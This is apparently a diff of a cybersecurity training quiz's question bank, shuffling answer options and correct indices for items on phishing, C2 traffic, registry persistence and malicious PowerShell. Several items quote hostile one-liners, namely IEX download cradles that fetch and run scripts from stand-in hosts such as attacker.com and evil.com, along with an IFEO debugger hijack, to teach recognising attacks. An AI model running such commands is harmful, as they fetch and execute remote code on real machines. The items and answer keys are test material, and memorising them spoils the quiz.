+                    "Legitimate job opportunity offer",
+                    "Networking opportunity on platform",
+                    "Phishing attempt on social media"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "If it seems too good to be true, it probably is",
                 explanation: "This is social media phishing. Attackers create fake recruiter profiles offering attractive jobs to steal information or infect systems. Always verify recruiters through official company channels."
             },
@@ -1372,10 +1372,10 @@
                 type: "multiple-choice",
                 question: "What is the safest way to access a website mentioned in an email?",
                 options: [
-                    "Click the link in the email",
-                    "Type the official URL directly into your browser",
-                    "Copy and paste the link",
-                    "Use a search engine to find the link"
+                    "Use search engine to find link",
+                    "Type official URL directly into browser",
+                    "Copy and paste the provided link",
+                    "Click the link in the email"
                 ],
                 correct: 1,
                 hint: "Don't trust links in emails",
@@ -1387,12 +1387,12 @@
                 type: "multiple-choice",
                 question: "What is a common phishing tactic involving fake package delivery notifications?",
                 options: [
-                    "Legitimate tracking updates",
-                    "Phishing emails with malicious links claiming failed deliveries",
+                    "Marketing from shipping companies",
+                    "Legitimate tracking updates sent",
                     "Actual delivery service communications",
-                    "Marketing from shipping companies"
+                    "Malicious links claiming failed deliveries"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Attackers exploit common activities like online shopping",
                 explanation: "Fake delivery notifications are common phishing tactics. They claim a package couldn't be delivered and require clicking a link to reschedule, which leads to credential theft or malware."
             },
@@ -1402,12 +1402,12 @@
                 type: "scenario",
                 question: "An email asks you to verify account information by replying with your SSN and date of birth. What is this?",
                 options: [
-                    "Routine security verification",
-                    "Clear phishing attempt - never send sensitive info via email",
-                    "Standard banking procedure",
-                    "Two-factor authentication"
+                    "Two-factor authentication process",
+                    "Standard banking procedure today",
+                    "Routine security verification step",
+                    "Clear phishing - never send via email"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Email is not a secure method for sensitive data",
                 explanation: "This is obvious phishing. Legitimate organizations never ask for sensitive information like SSNs via email. Email is not secure and such requests should always be reported."
             },
@@ -1417,12 +1417,12 @@
                 type: "multiple-choice",
                 question: "What is pharming?",
                 options: [
-                    "Phishing on farms",
-                    "Redirecting users from legitimate websites to malicious ones via DNS manipulation",
+                    "Mass email phishing campaigns",
                     "Phishing using pharmaceutical offers",
-                    "Mass email phishing campaigns"
+                    "Redirecting users via DNS manipulation",
+                    "Phishing on farms and agriculture"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "It involves manipulating where web traffic goes",
                 explanation: "Pharming redirects users from legitimate websites to malicious ones through DNS hijacking or hosts file modification, even when users type the correct URL. It's more sophisticated than traditional phishing."
             },
@@ -1432,10 +1432,10 @@
                 type: "scenario",
                 question: "You hover over a link and see the actual URL is different from the displayed text. What does this indicate?",
                 options: [
-                    "Normal web design",
-                    "Possible phishing - the link is deceptive",
-                    "A broken link",
-                    "Advanced security"
+                    "Advanced security feature enabled",
+                    "Possible phishing - link is deceptive",
+                    "Normal web design practice today",
+                    "A broken link on the website"
                 ],
                 correct: 1,
                 hint: "The link is trying to hide its real destination",
@@ -1447,12 +1447,12 @@
                 type: "multiple-choice",
                 question: "What should you do if you receive a suspicious phishing email?",
                 options: [
+                    "Forward it to all colleagues",
                     "Click the link to investigate",
-                    "Report it to IT/security team and delete it",
-                    "Reply to ask if it's legitimate",
-                    "Forward it to colleagues"
+                    "Report to IT/security and delete",
+                    "Reply to ask if it's legitimate"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Report threats to help protect others",
                 explanation: "Report suspicious emails to your IT/security team so they can warn others and block similar attacks. Then delete the email. Never click links, reply, or forward it which could spread the threat."
             },
@@ -1462,12 +1462,12 @@
                 type: "multiple-choice",
                 question: "What is credential harvesting in phishing attacks?",
                 options: [
+                    "Stealing physical credential cards",
                     "Growing databases of user information",
-                    "Collecting usernames and passwords through fake login pages",
-                    "Farming user credentials",
-                    "Stealing physical credential cards"
+                    "Collecting passwords via fake login pages",
+                    "Farming user credentials systematically"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "It's about collecting login credentials",
                 explanation: "Credential harvesting uses fake login pages that look identical to legitimate ones. When users enter their credentials, attackers capture them for unauthorized access to the real accounts."
             },
@@ -1479,12 +1479,12 @@
                 type: "scenario",
                 question: "You notice DNS queries to random subdomains every 30 seconds from a workstation. What attack technique is likely being used?",
                 options: [
-                    "DDoS attack",
-                    "DNS tunneling for data exfiltration or C2 communication",
-                    "Normal DNS behavior",
-                    "DNS cache poisoning"
+                    "Normal DNS behavior patterns",
+                    "DNS cache poisoning attack",
+                    "Distributed DDoS attack traffic",
+                    "DNS tunneling for C2 communication"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "DNS can be used as a covert communication channel",
                 explanation: "DNS tunneling uses DNS queries to exfiltrate data or establish C2 communication. The random subdomains encode data being transmitted, bypassing traditional firewall rules that allow DNS traffic."
             },
@@ -1494,10 +1494,10 @@
                 type: "multiple-choice",
                 question: "What is C2 (Command and Control) infrastructure?",
                 options: [
-                    "A security monitoring system",
-                    "Servers used by attackers to control compromised systems",
-                    "A firewall configuration",
-                    "An antivirus program"
+                    "Firewall configuration system setup",
+                    "Servers controlling compromised systems",
+                    "Security monitoring system software",
+                    "Antivirus program for protection"
                 ],
                 correct: 1,
                 hint: "Attackers need to communicate with infected systems",
@@ -1509,12 +1509,12 @@
                 type: "multiple-choice",
                 question: "What is beaconing in the context of network security?",
                 options: [
-                    "Using Bluetooth beacons",
-                    "Regular periodic connections from infected systems to C2 servers",
-                    "Network lighthouse systems",
-                    "Emergency alert systems"
+                    "Periodic connections from infected systems",
+                    "Using Bluetooth beacon technology",
+                    "Emergency alert systems signaling",
+                    "Network lighthouse guidance systems"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "Infected systems 'phone home' regularly",
                 explanation: "Beaconing is when malware makes regular, periodic connections to C2 servers to check for commands. This predictable pattern can be detected through network traffic analysis."
             },
@@ -1524,10 +1524,10 @@
                 type: "scenario",
                 question: "Network logs show HTTPS traffic to a legitimate CDN, but the payload appears encrypted differently. What technique might this be?",
                 options: [
-                    "Normal CDN traffic",
-                    "Domain fronting to hide C2 communication",
-                    "SSL/TLS inspection",
-                    "Content delivery optimization"
+                    "Content delivery optimization method",
+                    "Domain fronting to hide C2 traffic",
+                    "Normal CDN traffic patterns today",
+                    "SSL/TLS inspection by security tools"
                 ],
                 correct: 1,
                 hint: "Attackers can hide behind legitimate services",
@@ -1539,12 +1539,12 @@
                 type: "multiple-choice",
                 question: "What is fast flux in cybersecurity?",
                 options: [
-                    "Rapid data transmission",
-                    "Rapidly changing DNS records to hide malicious infrastructure",
-                    "Fast network switching",
-                    "Quick malware execution"
+                    "Quick malware execution speed",
+                    "Fast network switching technology",
+                    "Rapidly changing DNS records infrastructure",
+                    "Rapid data transmission protocol"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "DNS records keep changing rapidly",
                 explanation: "Fast flux rapidly changes DNS records associated with malicious domains, making it difficult to block or takedown C2 infrastructure as the IP addresses constantly change."
             },
@@ -1554,12 +1554,12 @@
                 type: "multiple-choice",
                 question: "What is a Domain Generation Algorithm (DGA)?",
                 options: [
-                    "Algorithm for creating secure domains",
-                    "Algorithm that generates random domain names for C2 communication",
+                    "DNS security protocol for protection",
                     "Domain name registration system",
-                    "DNS security protocol"
+                    "Generates random domains for C2 traffic",
+                    "Algorithm for creating secure domains"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Malware generates domain names algorithmically",
                 explanation: "DGAs generate large numbers of random domain names that malware can use to contact C2 servers. Even if some domains are blocked, the malware tries others until it finds an active C2 server."
             },
@@ -1569,12 +1569,12 @@
                 type: "scenario",
                 question: "You detect outbound HTTPS traffic on port 443 but the traffic pattern doesn't match typical web browsing. What might this indicate?",
                 options: [
-                    "Normal encrypted web traffic",
-                    "Possible C2 communication disguised as HTTPS",
-                    "Download manager activity",
-                    "Cloud synchronization"
+                    "Cloud synchronization activity ongoing",
+                    "Download manager activity in progress",
+                    "Possible C2 communication disguised HTTPS",
+                    "Normal encrypted web traffic patterns"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Attackers disguise C2 as legitimate protocols",
                 explanation: "C2 traffic often masquerades as legitimate protocols like HTTPS. Unusual patterns (constant packet sizes, regular intervals, high volumes) can indicate C2 rather than normal web browsing."
             },
@@ -1584,12 +1584,12 @@
                 type: "multiple-choice",
                 question: "What is protocol tunneling?",
                 options: [
-                    "Creating VPN connections",
-                    "Encapsulating one protocol inside another to bypass security controls",
-                    "Network cable management",
-                    "Protocol version upgrades"
+                    "Network cable management techniques",
+                    "Protocol version upgrade process",
+                    "Encapsulating protocols to bypass security",
+                    "Creating VPN connections securely"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Hiding one type of traffic inside another",
                 explanation: "Protocol tunneling encapsulates one protocol inside another (e.g., HTTP inside DNS) to bypass firewalls and security controls that only inspect the outer protocol."
             },
@@ -1599,12 +1599,12 @@
                 type: "multiple-choice",
                 question: "What port is commonly used for DNS traffic that attackers exploit for tunneling?",
                 options: [
-                    "Port 80",
-                    "Port 53",
-                    "Port 443",
-                    "Port 22"
+                    "Port 53 for DNS queries",
+                    "Port 443 for HTTPS traffic",
+                    "Port 80 for HTTP traffic",
+                    "Port 22 for SSH access"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "This is the standard DNS port",
                 explanation: "Port 53 is the standard DNS port. Since DNS traffic is usually allowed through firewalls, attackers exploit this by tunneling data through DNS queries and responses."
             },
@@ -1614,12 +1614,12 @@
                 type: "scenario",
                 question: "An infected system connects to multiple IP addresses in rapid succession, all on different networks. What is this behavior called?",
                 options: [
-                    "Load balancing",
-                    "IP hopping / Fast flux",
-                    "Network scanning",
-                    "Peer-to-peer networking"
+                    "Peer-to-peer networking activity",
+                    "Network scanning reconnaissance",
+                    "Load balancing traffic distribution",
+                    "IP hopping / Fast flux technique"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Rapidly changing connection targets",
                 explanation: "This is IP hopping or fast flux behavior where malware rapidly cycles through multiple IP addresses for C2 communication, making it harder to block and trace the actual C2 infrastructure."
             },
@@ -1629,12 +1629,12 @@
                 type: "multiple-choice",
                 question: "What is a dead drop resolver in C2 operations?",
                 options: [
-                    "A backup DNS server",
-                    "Using compromised legitimate websites to host encrypted C2 server addresses",
+                    "DNS resolution for inactive domains",
                     "Abandoned server infrastructure",
-                    "DNS resolution for inactive domains"
+                    "A backup DNS server system",
+                    "Compromised sites hosting C2 addresses"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Attackers leave 'dead drops' of information on legitimate sites",
                 explanation: "Dead drop resolvers use compromised or public platforms (like social media, forums, or legitimate websites) to post encrypted messages containing actual C2 server addresses, adding a layer of obfuscation."
             },
@@ -1644,12 +1644,12 @@
                 type: "scenario",
                 question: "Network monitoring shows encrypted traffic with unusually large DNS responses. What might this indicate?",
                 options: [
-                    "Normal DNSSEC activity",
+                    "IPv6 DNS records being used",
+                    "DNS server malfunction errors",
                     "DNS tunneling for data exfiltration",
-                    "DNS server malfunction",
-                    "IPv6 DNS records"
+                    "Normal DNSSEC activity today"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "DNS responses are normally very small",
                 explanation: "Normal DNS responses are small (typically under 512 bytes). Large DNS responses often indicate DNS tunneling where data is being exfiltrated by encoding it in DNS response packets."
             },
@@ -1659,12 +1659,12 @@
                 type: "multiple-choice",
                 question: "What is a water hole attack?",
                 options: [
-                    "Attacking water infrastructure",
-                    "Compromising websites frequently visited by target victims",
+                    "Network flooding attack technique",
                     "Phishing using water utility themes",
-                    "Network flooding attack"
+                    "Attacking water infrastructure systems",
+                    "Compromising frequently visited websites"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Predators wait at the water hole for prey",
                 explanation: "Watering hole attacks compromise legitimate websites that target victims frequently visit. When victims visit the compromised site, they're infected with malware. It's more targeted than mass phishing."
             },
@@ -1674,10 +1674,10 @@
                 type: "multiple-choice",
                 question: "What is the primary purpose of using HTTPS for C2 communication?",
                 options: [
-                    "To make the communication faster",
-                    "To encrypt C2 traffic and hide it from network inspection",
+                    "To reduce bandwidth usage significantly",
+                    "Encrypt C2 traffic hiding from inspection",
                     "To comply with web standards",
-                    "To reduce bandwidth usage"
+                    "To make communication faster"
                 ],
                 correct: 1,
                 hint: "HTTPS provides encryption",
@@ -1689,12 +1689,12 @@
                 type: "scenario",
                 question: "You notice connections to domains that were registered very recently. What might this indicate?",
                 options: [
-                    "New legitimate businesses",
-                    "Possible C2 infrastructure - attackers often use newly registered domains",
-                    "DNS configuration errors",
-                    "Normal internet growth"
+                    "Normal internet growth patterns",
+                    "DNS configuration errors occurring",
+                    "New legitimate businesses starting",
+                    "Possible C2 infrastructure - fresh domains"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Attackers frequently register fresh domains",
                 explanation: "Newly registered domains are suspicious as attackers frequently register new domains for C2 infrastructure to avoid blocklists. Legitimate businesses typically use established domains."
             },
@@ -1704,12 +1704,12 @@
                 type: "multiple-choice",
                 question: "What is a Man-in-the-Middle (MitM) attack?",
                 options: [
-                    "An attack using middle management",
-                    "Intercepting and potentially altering communications between two parties",
-                    "Attacking the middle layer of networks",
-                    "Compromising middleware applications"
+                    "Compromising middleware applications",
+                    "Attacking the middle layer networks",
+                    "Intercepting communications between parties",
+                    "An attack using middle management"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "The attacker sits 'in the middle' of the communication",
                 explanation: "In MitM attacks, the attacker intercepts communications between two parties, potentially reading, modifying, or injecting content while both parties believe they're communicating directly with each other."
             },
@@ -1719,12 +1719,12 @@
                 type: "multiple-choice",
                 question: "What is the purpose of a DDoS (Distributed Denial of Service) attack?",
                 options: [
-                    "To steal data",
-                    "To overwhelm and make systems or services unavailable",
-                    "To install malware",
-                    "To crack passwords"
+                    "To crack passwords systematically",
+                    "To install malware on systems",
+                    "To steal sensitive data files",
+                    "Overwhelm and make services unavailable"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "The goal is to deny service to legitimate users",
                 explanation: "DDoS attacks flood systems with traffic from multiple sources, overwhelming resources and making services unavailable to legitimate users. They can be used for extortion, distraction, or activism."
             },
@@ -1734,12 +1734,12 @@
                 type: "scenario",
                 question: "An employee's computer is part of a botnet sending DDoS traffic. What role is it playing?",
                 options: [
-                    "C2 server",
-                    "Bot/Zombie - a compromised system controlled by attackers",
-                    "Victim of the DDoS",
-                    "Network router"
+                    "Network router forwarding traffic",
+                    "Victim of the DDoS attack",
+                    "Bot/Zombie controlled by attackers",
+                    "C2 server controlling other systems"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "It's being controlled to attack others",
                 explanation: "The computer is a bot or zombie - a compromised system controlled by attackers through C2 infrastructure to participate in attacks. Botnets consist of thousands of such compromised systems."
             },
@@ -1749,12 +1749,12 @@
                 type: "multiple-choice",
                 question: "What is covert channel communication?",
                 options: [
+                    "VPN connections for remote access",
+                    "Encrypted email communication",
                     "Secret government communication",
-                    "Using unconventional methods to transmit data that bypass security controls",
-                    "Encrypted email",
-                    "VPN connections"
+                    "Unconventional methods bypassing security"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Communication through unexpected channels",
                 explanation: "Covert channels use unexpected methods to transmit data, such as hiding information in image files (steganography), DNS queries, or other seemingly innocuous traffic to bypass security monitoring."
             },
@@ -1764,10 +1764,10 @@
                 type: "multiple-choice",
                 question: "What makes identifying C2 traffic difficult?",
                 options: [
-                    "It uses outdated protocols",
-                    "It often mimics legitimate traffic and uses encryption",
-                    "It only runs at night",
-                    "It uses unique port numbers"
+                    "It uses unique port numbers",
+                    "Mimics legitimate traffic with encryption",
+                    "It only runs at nighttime",
+                    "It uses outdated protocols"
                 ],
                 correct: 1,
                 hint: "Attackers try to blend in with normal traffic",
@@ -1782,10 +1782,10 @@
                 question: "What is the purpose of this registry key for malware?",
                 code: "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                 options: [
-                    "System configuration storage",
-                    "Autostart persistence - programs here run at every user login",
-                    "Temporary file location",
-                    "Network configuration"
+                    "Network configuration settings storage",
+                    "Autostart persistence runs at login",
+                    "Temporary file location configuration",
+                    "System configuration storage location"
                 ],
                 correct: 1,
                 hint: "Notice the 'Run' at the end of the path",
@@ -1797,12 +1797,12 @@
                 type: "multiple-choice",
                 question: "What is the difference between HKLM and HKCU registry hives?",
                 options: [
-                    "No difference",
-                    "HKLM affects all users, HKCU affects only the current user",
-                    "HKLM is for hardware, HKCU is for software",
-                    "HKLM is local, HKCU is cloud-based"
+                    "HKLM affects all users system-wide",
+                    "No difference between the two",
+                    "HKLM is local, HKCU is cloud-based",
+                    "HKLM is hardware, HKCU is software"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "LM = Local Machine, CU = Current User",
                 explanation: "HKLM (HKEY_LOCAL_MACHINE) affects all users system-wide and requires admin privileges. HKCU (HKEY_CURRENT_USER) only affects the current user and doesn't require elevation."
             },
@@ -1813,12 +1813,12 @@
                 question: "Is this registry location suspicious for malware persistence?",
                 code: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                 options: [
-                    "No, it's a system-protected location",
-                    "Yes, it's commonly used for user-level persistence",
-                    "No, only HKLM locations are used for persistence",
-                    "Yes, but only for legitimate software"
+                    "No, only HKLM locations used",
+                    "No, it's system-protected location",
+                    "Yes, but only legitimate software uses",
+                    "Yes, commonly used for user-level persistence"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Malware can achieve persistence without admin rights",
                 explanation: "HKCU Run keys provide user-level persistence without requiring administrator privileges, making them attractive for malware. They should be monitored for suspicious entries."
             },
@@ -1828,12 +1828,12 @@
                 type: "multiple-choice",
                 question: "What is the Services registry key used for?",
                 options: [
-                    "Web service configuration",
+                    "Network service ports configuration",
+                    "Customer service settings storage",
                     "Windows service configuration and startup",
-                    "Network service ports",
-                    "Customer service settings"
+                    "Web service configuration management"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Think about Windows services that run in the background",
                 explanation: "The Services registry key (HKLM\\System\\CurrentControlSet\\Services) controls Windows services. Malware can create malicious services here for persistent execution with high privileges."
             },
@@ -1843,12 +1843,12 @@
                 type: "scenario",
                 question: "You find a suspicious DLL registered in 'AppInit_DLLs'. What does this indicate?",
                 options: [
-                    "Normal application initialization",
-                    "Potential malware - this DLL will load into every process",
-                    "Graphics driver configuration",
-                    "Network protocol handler"
+                    "Network protocol handler configuration",
+                    "Graphics driver configuration settings",
+                    "Malware - DLL loads into every process",
+                    "Normal application initialization process"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "This DLL gets injected everywhere",
                 explanation: "AppInit_DLLs registry key causes listed DLLs to load into every process that loads user32.dll. This powerful persistence mechanism is frequently abused by malware for code injection."
             },
@@ -1859,12 +1859,12 @@
                 question: "What attack technique does this registry key indicate?",
                 code: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\\Debugger = \"malware.exe\"",
                 options: [
-                    "Legitimate debugging configuration",
-                    "Debugger hijacking - malware runs instead of Task Manager",
-                    "Performance optimization",
-                    "Application compatibility setting"
+                    "Application compatibility setting",
+                    "Performance optimization technique",
+                    "Debugger hijacking runs malware instead",
+                    "Legitimate debugging configuration"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "The 'Debugger' value redirects execution",
                 explanation: "This is IFEO (Image File Execution Options) debugger hijacking. When someone tries to run Task Manager, the malware runs instead, effectively blocking Task Manager while maintaining persistence."
             },
@@ -1874,10 +1874,10 @@
                 type: "multiple-choice",
                 question: "Which PowerShell command can detect suspicious registry Run keys?",
                 options: [
-                    "Get-Process",
-                    "Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
-                    "Get-Service",
-                    "Get-EventLog"
+                    "Get-Process for running programs",
+                    "Get-ItemProperty for registry access",
+                    "Get-Service for Windows services",
+                    "Get-EventLog for system logs"
                 ],
                 correct: 1,
                 hint: "Use Get-ItemProperty for registry access",
@@ -1889,12 +1889,12 @@
                 type: "scenario",
                 question: "Malware modified the 'Winlogon\\Shell' registry value. What does this accomplish?",
                 options: [
-                    "Changes desktop appearance",
-                    "Replaces the Windows shell with malware for system-wide persistence",
-                    "Modifies login screen",
-                    "Updates Windows Explorer settings"
+                    "Updates Windows Explorer settings",
+                    "Modifies login screen appearance",
+                    "Replaces shell with malware persistence",
+                    "Changes desktop appearance settings"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "The Shell value determines what runs as the user interface",
                 explanation: "The Winlogon Shell registry value specifies the Windows user interface (normally explorer.exe). Changing it allows malware to run instead of or alongside the legitimate shell with full user privileges."
             },
@@ -1904,12 +1904,12 @@
                 type: "multiple-choice",
                 question: "What is the purpose of the 'RunOnce' registry key?",
                 options: [
-                    "Runs programs repeatedly",
-                    "Runs programs once at next logon then deletes the entry",
-                    "Runs programs only on Sundays",
-                    "Runs the most recently used program"
+                    "Runs the most recently used program",
+                    "Runs programs only on Sunday schedule",
+                    "Runs programs repeatedly at startup",
+                    "Runs once at next logon then deletes"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "The name indicates it only runs one time",
                 explanation: "RunOnce keys execute programs once at the next user login, then automatically delete the entry. Malware sometimes uses this for initial deployment before establishing other persistence mechanisms."
             },
@@ -1920,12 +1920,12 @@
                 question: "What security concern does this registry modification present?",
                 code: "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute",
                 options: [
-                    "None, it's just boot configuration",
-                    "High concern - malware here runs before security software loads",
+                    "Malware runs before security software loads",
                     "Minor concern - only affects boot speed",
-                    "No concern - it's read-only"
+                    "None, it's just boot configuration",
+                    "No concern - it's read-only location"
                 ],
-                correct: 1,
+                correct: 0,
                 hint: "This runs very early in the boot process",
                 explanation: "BootExecute runs programs during boot before most security software loads. Malware here executes with SYSTEM privileges before antivirus can detect it, making it extremely dangerous for persistence."
             },
@@ -1938,12 +1938,12 @@
                 question: "Is this PowerShell command malicious?",
                 code: "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')\"",
                 options: [
+                    "Maybe, need more context to determine",
                     "No, this is normal system administration",
-                    "Yes - hidden window, bypassed security, downloading and executing code",
-                    "No, this is just downloading a file",
-                    "Maybe, need more context"
+                    "Yes - hidden, bypassed, downloading code",
+                    "No, this is just downloading files"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Look at the flags and what it's downloading",
                 explanation: "This is highly malicious: -WindowStyle Hidden conceals execution, -ExecutionPolicy Bypass disables security, and IEX downloads and immediately executes code from a remote server (download cradle)."
             },
@@ -1953,12 +1953,12 @@
                 type: "multiple-choice",
                 question: "What does the '-enc' or '-EncodedCommand' parameter indicate?",
                 options: [
-                    "Encrypted secure command",
-                    "Base64-encoded command often used to obfuscate malicious code",
-                    "Enhanced command execution",
-                    "Encoded for performance"
+                    "Encoded for performance optimization",
+                    "Enhanced command execution speed",
+                    "Base64-encoded often obfuscating code",
+                    "Encrypted secure command execution"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Encoding can hide malicious commands",
                 explanation: "The -EncodedCommand parameter accepts Base64-encoded commands. While legitimate uses exist, attackers frequently use it to obfuscate malicious code and bypass basic string-based detection."
             },
@@ -1969,12 +1969,12 @@
                 question: "What malicious technique does this PowerShell snippet use?",
                 code: "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
                 options: [
-                    "File download only",
-                    "Download cradle - downloads and immediately executes code",
-                    "Web scraping",
-                    "Configuration file retrieval"
+                    "Web scraping for data collection",
+                    "Configuration file retrieval only",
+                    "Download cradle downloads and executes",
+                    "File download only without execution"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "IEX means Invoke-Expression",
                 explanation: "This is a download cradle. DownloadString fetches the script from the remote server, and IEX (Invoke-Expression) immediately executes it in memory without writing to disk, evading file-based detection."
             },
@@ -1984,12 +1984,12 @@
                 type: "scenario",
                 question: "Excel spawns powershell.exe after opening an email attachment. What attack is likely occurring?",
                 options: [
-                    "Normal Office functionality",
-                    "Macro-based malware using PowerShell for payload delivery",
-                    "Office update process",
-                    "Legitimate automation script"
+                    "Legitimate automation script running",
+                    "Office update process in progress",
+                    "Macro-based malware payload delivery",
+                    "Normal Office functionality behavior"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Office apps shouldn't normally spawn PowerShell",
                 explanation: "This is a strong indicator of macro-based malware. A malicious Office document with macros is using PowerShell to download and execute additional malware. Office apps spawning PowerShell is highly suspicious."
             },
@@ -2000,10 +2000,10 @@
                 question: "What is suspicious about this PowerShell command?",
                 code: "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://bit.ly/a42bz'))\"",
                 options: [
-                    "Nothing suspicious",
-                    "Multiple red flags: hidden window, no profile, download cradle, URL shortener",
-                    "Just a shortened URL",
-                    "Normal script execution"
+                    "Normal script execution pattern",
+                    "Multiple red flags: hidden, cradle, URL",
+                    "Nothing suspicious at all here",
+                    "Just a shortened URL being used"
                 ],
                 correct: 1,
                 hint: "Count how many suspicious elements are present",
@@ -2015,12 +2015,12 @@
                 type: "multiple-choice",
                 question: "What does 'PowerShell reflection' refer to in offensive security?",
                 options: [
-                    "Mirroring PowerShell commands",
-                    "Loading and executing .NET assemblies directly in memory",
-                    "PowerShell logging",
-                    "PowerShell performance analysis"
+                    "PowerShell performance analysis tool",
+                    "PowerShell logging functionality",
+                    "Loading .NET assemblies in memory",
+                    "Mirroring PowerShell commands"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "It's about loading code without writing to disk",
                 explanation: "PowerShell reflection uses .NET reflection capabilities to load and execute assemblies (DLLs/executables) directly in memory without touching disk, making detection much harder for file-based security tools."
             },
@@ -2031,12 +2031,12 @@
                 question: "What obfuscation technique is used here?",
                 code: "$x='IEX';$y='(New-Object Net.WebClient)';$z='.DownloadString';$cmd=$x+' '+$y+$z+'(''http://evil.com/a'')';IEX $cmd",
                 options: [
-                    "No obfuscation present",
-                    "String concatenation to hide the actual command",
-                    "Encryption",
-                    "Compression"
+                    "Compression reducing file size",
+                    "Encryption hiding data completely",
+                    "String concatenation hiding command",
+                    "No obfuscation present here"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "The command is split into multiple parts",
                 explanation: "This uses string concatenation obfuscation, splitting the malicious command across multiple variables to evade signature-based detection that looks for complete command strings."
             },
@@ -2046,12 +2046,12 @@
                 type: "scenario",
                 question: "You find PowerShell script block logging is disabled on a system. What might this indicate?",
                 options: [
-                    "Normal default configuration",
-                    "Possible attacker activity to avoid detection",
-                    "Performance optimization",
-                    "Privacy enhancement"
+                    "Privacy enhancement feature enabled",
+                    "Performance optimization setting",
+                    "Possible attacker activity avoiding detection",
+                    "Normal default configuration today"
                 ],
-                correct: 1,
+                correct: 2,
                 hint: "Logging helps detect malicious activity",
                 explanation: "Attackers often disable PowerShell logging (script block, module, and transcription logging) to hide their activities. Organizations should enable logging and monitor for attempts to disable it."
             },
@@ -2061,12 +2061,12 @@
                 type: "multiple-choice",
                 question: "What is 'Living off the Land' in PowerShell attacks?",
                 options: [
-                    "Attacks from remote locations",
-                    "Using legitimate system tools (like PowerShell) for malicious purposes",
+                    "Using only open-source tools",
                     "Attacks without internet connection",
-                    "Using only open-source tools"
+                    "Attacks from remote locations",
+                    "Using legitimate system tools maliciously"
                 ],
-                correct: 1,
+                correct: 3,
                 hint: "Using tools already on the system",
                 explanation: "'Living off the Land' means using legitimate system tools (PowerShell, WMI, certutil, etc.) for malicious purposes. Since these tools are trusted and already present, attacks are harder to detect."
             },
@@ -2077,10 +2077,10 @@
                 question: "What does this PowerShell command pattern suggest?",
                 code: "powershell.exe -noprofile -windowstyle hidden -ep bypass -command [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('encoded_payload_here'))",
                 options: [
-                    "Legitimate system script",
-                    "Malicious: hidden execution, bypassed policy, base64 decoding",
-                    "PowerShell update process",
-                    "Normal application installation"
+                    "Normal application installation process",
+                    "Malicious: hidden, bypassed, base64 decoding",
+                    "PowerShell update process running",
+                    "Legitimate system script execution"
                 ],
                 correct: 1,
                 hint: "Look at all the security bypasses and encoding",
